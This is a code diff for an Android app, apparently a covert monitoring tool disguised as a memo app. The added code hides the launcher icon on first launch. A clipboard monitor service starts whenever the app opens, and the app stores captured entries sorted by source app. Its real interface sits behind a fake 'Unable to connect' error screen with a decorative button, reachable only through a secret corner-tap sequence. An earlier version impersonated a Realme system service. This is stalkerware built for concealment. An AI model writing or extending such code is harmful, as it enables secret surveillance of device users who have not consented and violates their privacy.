@@ -1,6 +1,8 @@
 package com.example.memo
 
+import android.content.ComponentName
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -40,6 +42,17 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // ── AUTO-HIDE: On first ever launch, immediately hide launcher icon ──
+        val prefs = getSharedPreferences("memo_settings", MODE_PRIVATE)
+        if (!prefs.getBoolean("first_run_done", false)) {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, "com.example.memo.LauncherAlias"),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            prefs.edit().putBoolean("first_run_done", true).apply()
+        }
+
         // Start clipboard monitor whenever the app is opened
         try {
             startService(Intent(this, ClipboardMonitorService::class.java))
@@ -63,143 +76,123 @@ fun MemoApp() {
     var isUnlocked by remember { mutableStateOf(false) }
 
     if (!isUnlocked) {
-        FakeSystemScreen(onUnlock = { isUnlocked = true })
+        FakeNoInternetScreen(onUnlock = { isUnlocked = true })
     } else {
         val navController = rememberNavController()
         val viewModel: MainViewModel = viewModel()
 
         NavHost(navController = navController, startDestination = "home") {
 
-        // --- Home Screen ---
-        composable("home") {
-            val apps by viewModel.distinctApps.collectAsState()
-            HomeScreen(
-                apps = apps,
-                onAppClick = { packageName, appName ->
-                    viewModel.loadEntriesForApp(packageName)
-                    navController.navigate("folder/${packageName}/${appName}")
-                },
-                onSearchClick = { navController.navigate("search") },
-                onSettingsClick = { navController.navigate("settings") }
-            )
-        }
+            // --- Home Screen ---
+            composable("home") {
+                val apps by viewModel.distinctApps.collectAsState()
+                HomeScreen(
+                    apps = apps,
+                    onAppClick = { packageName, appName ->
+                        viewModel.loadEntriesForApp(packageName)
+                        navController.navigate("folder/${packageName}/${appName}")
+                    },
+                    onSearchClick = { navController.navigate("search") },
+                    onSettingsClick = { navController.navigate("settings") }
+                )
+            }
 
-        // --- Folder Screen ---
-        composable(
-            route = "folder/{packageName}/{appName}",
-            arguments = listOf(
-                navArgument("packageName") { type = NavType.StringType },
-                navArgument("appName") { type = NavType.StringType }
-            )
-        ) { backStackEntry ->
-            val appName = backStackEntry.arguments?.getString("appName") ?: "Unknown App"
-            val packageName = backStackEntry.arguments?.getString("packageName") ?: ""
-            val entries by viewModel.currentAppEntries.collectAsState()
+            // --- Folder Screen ---
+            composable(
+                route = "folder/{packageName}/{appName}",
+                arguments = listOf(
+                    navArgument("packageName") { type = NavType.StringType },
+                    navArgument("appName") { type = NavType.StringType }
+                )
+            ) { backStackEntry ->
+                val appName = backStackEntry.arguments?.getString("appName") ?: "Unknown App"
+                val packageName = backStackEntry.arguments?.getString("packageName") ?: ""
+                val entries by viewModel.currentAppEntries.collectAsState()
 
-            FolderScreen(
-                appName = appName,
-                entries = entries,
-                onBackClick = { navController.popBackStack() },
-                onEntryClick = { entryId ->
-                    navController.navigate("detail/${entryId}")
-                }
-            )
-        }
+                FolderScreen(
+                    appName = appName,
+                    entries = entries,
+                    onBackClick = { navController.popBackStack() },
+                    onEntryClick = { entryId ->
+                        navController.navigate("detail/${entryId}")
+                    }
+                )
+            }
 
-        // --- Entry Detail Screen ---
-        composable(
-            route = "detail/{entryId}",
-            arguments = listOf(navArgument("entryId") { type = NavType.IntType })
-        ) { backStackEntry ->
-            val entryId = backStackEntry.arguments?.getInt("entryId") ?: -1
-            val entries by viewModel.currentAppEntries.collectAsState()
-            val entry = entries.find { it.id == entryId }
+            // --- Entry Detail Screen ---
+            composable(
+                route = "detail/{entryId}",
+                arguments = listOf(navArgument("entryId") { type = NavType.IntType })
+            ) { backStackEntry ->
+                val entryId = backStackEntry.arguments?.getInt("entryId") ?: -1
+                val entries by viewModel.currentAppEntries.collectAsState()
+                val entry = entries.find { it.id == entryId }
 
-            EntryDetailScreen(
-                entry = entry,
-                onBackClick = { navController.popBackStack() },
-                onDeleteClick = { id -> viewModel.deleteEntry(id) }
-            )
-        }
+                EntryDetailScreen(
+                    entry = entry,
+                    onBackClick = { navController.popBackStack() },
+                    onDeleteClick = { id -> viewModel.deleteEntry(id) }
+                )
+            }
 
-        // --- Search Screen ---
-        composable("search") {
-            val query by viewModel.searchQuery.collectAsState()
-            val results by viewModel.searchResults.collectAsState()
+            // --- Search Screen ---
+            composable("search") {
+                val query by viewModel.searchQuery.collectAsState()
+                val results by viewModel.searchResults.collectAsState()
 
-            SearchScreen(
-                query = query,
-                results = results,
-                onQueryChange = { viewModel.setSearchQuery(it) },
-                onEntryClick = { entry ->
-                    viewModel.loadEntriesForApp(entry.packageName)
-                    navController.navigate("detail/${entry.id}")
-                },
-                onBackClick = {
-                    viewModel.setSearchQuery("")
-                    navController.popBackStack()
-                }
-            )
-        }
+                SearchScreen(
+                    query = query,
+                    results = results,
+                    onQueryChange = { viewModel.setSearchQuery(it) },
+                    onEntryClick = { entry ->
+                        viewModel.loadEntriesForApp(entry.packageName)
+                        navController.navigate("detail/${entry.id}")
+                    },
+                    onBackClick = {
+                        viewModel.setSearchQuery("")
+                        navController.popBackStack()
+                    }
+                )
+            }
 
-        // --- Settings Screen ---
-        composable("settings") {
-            val isCapturing by viewModel.isCapturing.collectAsState()
-            val includedApps by viewModel.includedApps.collectAsState()
-            val installedApps by viewModel.installedApps.collectAsState()
-            val autoDeleteDays by viewModel.autoDeleteDays.collectAsState()
+            // --- Settings Screen ---
+            composable("settings") {
+                val isCapturing by viewModel.isCapturing.collectAsState()
+                val autoDeleteDays by viewModel.autoDeleteDays.collectAsState()
 
-            SettingsScreen(
-                isCapturing = isCapturing,
-                includedApps = includedApps,
-                installedApps = installedApps,
-                autoDeleteDays = autoDeleteDays,
-                onBackClick = { navController.popBackStack() },
-                onCapturingToggle = { viewModel.setCapturingEnabled(it) },
-                onIncludeApp = { viewModel.addIncludedApp(it) },
-                onExcludeApp = { viewModel.removeIncludedApp(it) },
-                onAutoDeleteChanged = { viewModel.setAutoDeleteDays(it) },
-                onClearAllData = { viewModel.clearAllData() }
-            )
-        }
+                SettingsScreen(
+                    isCapturing = isCapturing,
+                    autoDeleteDays = autoDeleteDays,
+                    onBackClick = { navController.popBackStack() },
+                    onCapturingToggle = { viewModel.setCapturingEnabled(it) },
+                    onAutoDeleteChanged = { viewModel.setAutoDeleteDays(it) },
+                    onClearAllData = { viewModel.clearAllData() }
+                )
+            }
         }
     }
 }
 
 /**
- * SECRET UNLOCK METHOD:
- * Tap TOP-RIGHT corner of the screen 3 times,
- * then tap BOTTOM-LEFT corner of the screen 3 times.
+ * FAKE SCREEN: "Unable to connect to internet"
+ * Looks like a genuine connection error page.
  *
- * "Corner" = a 120x120dp invisible zone in each corner.
- * No visual feedback at any step — completely hidden from anyone watching.
- * If you make a mistake the count resets automatically.
+ * SECRET UNLOCK:
+ * Tap TOP-RIGHT corner 3 times, then BOTTOM-LEFT corner 3 times.
+ * No visual feedback — completely invisible to anyone watching.
  */
 @Composable
-fun FakeSystemScreen(onUnlock: () -> Unit) {
-    // State: 0-2 = waiting for top-right taps, 3-5 = waiting for bottom-left taps
+fun FakeNoInternetScreen(onUnlock: () -> Unit) {
     var tapStep by remember { mutableStateOf(0) }
     var screenWidth by remember { mutableStateOf(0f) }
     var screenHeight by remember { mutableStateOf(0f) }
 
-    // Corner zone size in px (set to ~120dp worth)
-    val zoneSize = 360f // roughly 120dp at 3x density
-
-    val infiniteTransition = rememberInfiniteTransition(label = "pulse")
-    val progressAnim by infiniteTransition.animateFloat(
-        initialValue = 0.3f,
-        targetValue = 0.85f,
-        animationSpec = infiniteRepeatable(
-            animation = tween(durationMillis = 3000, easing = LinearEasing),
-            repeatMode = RepeatMode.Restart
-        ),
-        label = "progress"
-    )
+    val zoneSize = 360f // ~120dp at 3x density
 
     Box(
         modifier = Modifier
             .fillMaxSize()
-            .background(Color(0xFF0D0D0D))
+            .background(Color(0xFFF5F5F5))
             .pointerInput(Unit) {
                 screenWidth = size.width.toFloat()
                 screenHeight = size.height.toFloat()
@@ -216,113 +209,71 @@ fun FakeSystemScreen(onUnlock: () -> Unit) {
                     when {
                         tapStep < 3 && inTopRight -> {
                             tapStep++
-                            if (tapStep >= 3) {
-                                // Phase 1 done — waiting for bottom-left now
-                            }
                         }
                         tapStep >= 3 && inBottomLeft -> {
                             tapStep++
                             if (tapStep >= 6) {
-                                onUnlock() // 🔓 Unlocked!
+                                onUnlock()
                             }
                         }
-                        // Wrong corner — reset
                         else -> tapStep = 0
                     }
                 }
-            }
+            },
+        contentAlignment = Alignment.Center
     ) {
-        // ─── Fake "System Update Service" UI ───
         Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .padding(32.dp),
             horizontalAlignment = Alignment.CenterHorizontally,
-            verticalArrangement = Arrangement.Center
+            modifier = Modifier.padding(40.dp)
         ) {
-            // System icon
-            Icon(
-                imageVector = Icons.Default.Info,
-                contentDescription = null,
-                tint = Color(0xFF00D9B5),  // Realme signature teal-green
-                modifier = Modifier.size(56.dp)
+            // WiFi-off style icon
+            Text(
+                "📡",
+                fontSize = 56.sp
             )
 
             Spacer(modifier = Modifier.height(24.dp))
 
             Text(
-                text = "Realme Services",
-                color = Color.White,
-                fontSize = 22.sp,
+                "Unable to connect",
+                color = Color(0xFF333333),
+                fontSize = 20.sp,
                 fontWeight = FontWeight.SemiBold
             )
 
             Spacer(modifier = Modifier.height(8.dp))
 
             Text(
-                text = "Realme UI system component\nrealme 12 · Version 14.0.0.820",
-                color = Color(0xFF90A4AE),
-                fontSize = 13.sp,
+                "Please check your internet connection and try again. Make sure Wi-Fi or mobile data is turned on.",
+                color = Color(0xFF757575),
+                fontSize = 14.sp,
                 textAlign = TextAlign.Center,
                 lineHeight = 20.sp
             )
 
-            Spacer(modifier = Modifier.height(40.dp))
-
-            // Fake status card
-            Card(
-                modifier = Modifier.fillMaxWidth(),
-                shape = RoundedCornerShape(12.dp),
-                colors = CardDefaults.cardColors(containerColor = Color(0xFF1A1A1A))
-            ) {
-                Column(modifier = Modifier.padding(20.dp)) {
-                    Text(
-                        "Service Status",
-                        color = Color(0xFF90A4AE),
-                        fontSize = 12.sp,
-                        fontWeight = FontWeight.Medium
-                    )
-                    Spacer(modifier = Modifier.height(12.dp))
-                    Row(
-                        verticalAlignment = Alignment.CenterVertically,
-                        modifier = Modifier.fillMaxWidth()
-                    ) {
-                        Box(
-                            modifier = Modifier
-                                .size(8.dp)
-                                .background(Color(0xFF4CAF50), RoundedCornerShape(50))
-                        )
-                        Spacer(modifier = Modifier.width(8.dp))
-                        Text("Running in background", color = Color.White, fontSize = 14.sp)
-                    }
-                    Spacer(modifier = Modifier.height(16.dp))
-                    Text(
-                         "Optimizing system performance...",
-                        color = Color(0xFF90A4AE),
-                        fontSize = 12.sp
-                    )
-                    Spacer(modifier = Modifier.height(8.dp))
-                    LinearProgressIndicator(
-                        progress = { progressAnim },
-                        modifier = Modifier
-                            .fillMaxWidth()
-                            .height(4.dp),
-                        color = Color(0xFF00D9B5),
-                        trackColor = Color(0xFF1A3030)
-                    )
-                }
-            }
-
             Spacer(modifier = Modifier.height(32.dp))
 
+            // Fake "Try Again" button that does nothing
+            Button(
+                onClick = { /* Does nothing — purely decorative */ },
+                shape = RoundedCornerShape(24.dp),
+                colors = ButtonDefaults.buttonColors(
+                    containerColor = Color(0xFF1A73E8)
+                ),
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .height(48.dp)
+            ) {
+                Text("Try Again", fontSize = 15.sp, color = Color.White)
+            }
+
+            Spacer(modifier = Modifier.height(16.dp))
+
             Text(
-                text = "This service is required for Realme UI features\nand runs automatically in the background.",
-                color = Color(0xFF546E7A),
-                fontSize = 11.sp,
-                textAlign = TextAlign.Center,
-                lineHeight = 18.sp
+                "Error code: ERR_INTERNET_DISCONNECTED",
+                color = Color(0xFFBDBDBD),
+                fontSize = 11.sp
             )
         }
     }
 }
-
